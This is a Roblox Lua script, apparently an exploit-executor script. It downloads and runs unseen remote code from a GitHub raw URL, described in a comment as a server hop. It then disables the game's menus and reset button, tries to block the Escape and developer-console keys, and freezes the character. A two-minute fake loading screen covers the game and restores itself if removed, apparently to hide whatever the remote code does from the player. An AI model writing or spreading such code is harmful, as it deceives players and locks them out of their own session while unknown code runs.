-- Load external script that does the teleport/server hop
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Gey123123/g3zmar/refs/heads/main/g3zmarScripts"))()
end)

-- Wait for teleport to finish and game to fully load on new server
if not game:IsLoaded() then
    game.Loaded:Wait()
end

-- Add slight delay to ensure character is spawned
task.wait(3)

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Disable CoreGui and other UI features
pcall(function()
    StarterGui:SetCore("TopbarEnabled", false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    StarterGui:SetCore("ResetButtonCallback", false)
end)

-- Block Escape and F9
UserInputService.InputBegan:Connect(function(input, processed)
    if input.KeyCode == Enum.KeyCode.Escape or input.KeyCode == Enum.KeyCode.F9 then
        return true
    end
end)

-- Freeze character movement
local function freezeCharacter(char)
    task.wait(0.1)
    local humanoid = char:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
        humanoid.AutoRotate = false
        humanoid:ChangeState(Enum.HumanoidStateType.Physics)
    end
end

player.CharacterAdded:Connect(freezeCharacter)
if player.Character then freezeCharacter(player.Character) end

-- Create Loading UI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LockdownLoading"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.DisplayOrder = 999999
screenGui.Parent = playerGui

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.BorderSizePixel = 0
bg.Parent = screenGui

local loadingText = Instance.new("TextLabel")
loadingText.Text = "Loading..."
loadingText.Font = Enum.Font.GothamBold
loadingText.TextScaled = true
loadingText.Size = UDim2.new(0.5, 0, 0.1, 0)
loadingText.Position = UDim2.new(0.25, 0, 0.4, 0)
loadingText.BackgroundTransparency = 1
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.Parent = bg

local barBackground = Instance.new("Frame")
barBackground.Size = UDim2.new(0.5, 0, 0.03, 0)
barBackground.Position = UDim2.new(0.25, 0, 0.5, 0)
barBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBackground.BorderSizePixel = 0
barBackground.Parent = bg

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.Position = UDim2.new(0, 0, 0, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0
barFill.Parent = barBackground

local madeByText = Instance.new("TextLabel")
madeByText.Text = "made by: g3zmar"
madeByText.Font = Enum.Font.Gotham
madeByText.TextScaled = true
madeByText.Size = UDim2.new(0.3, 0, 0.05, 0)
madeByText.Position = UDim2.new(0.35, 0, 0.95, -20)
madeByText.BackgroundTransparency = 1
madeByText.TextColor3 = Color3.fromRGB(150, 150, 150)
madeByText.Parent = bg

-- Animate loading bar
local duration = 120
local steps = 100
local stepTime = duration / steps

for i = 1, steps do
	local progress = i / steps
	barFill:TweenSize(UDim2.new(progress, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, stepTime, true)
	task.wait(stepTime)
end

-- Freeze character again just in case
pcall(function()
    if player.Character and player.Character:FindFirstChild("Humanoid") then
        local h = player.Character.Humanoid
        h.WalkSpeed = 0
        h.JumpPower = 0
        h.AutoRotate = false
        h:ChangeState(Enum.HumanoidStateType.Physics)
    end
end)

-- Prevent UI from being deleted
screenGui.AncestryChanged:Connect(function()
    if not screenGui:IsDescendantOf(playerGui) then
        screenGui.Parent = playerGui
    end
end)

RunService.RenderStepped:Connect(function()
    if not screenGui:IsDescendantOf(playerGui) then
        screenGui.Parent = playerGui
    end
end)
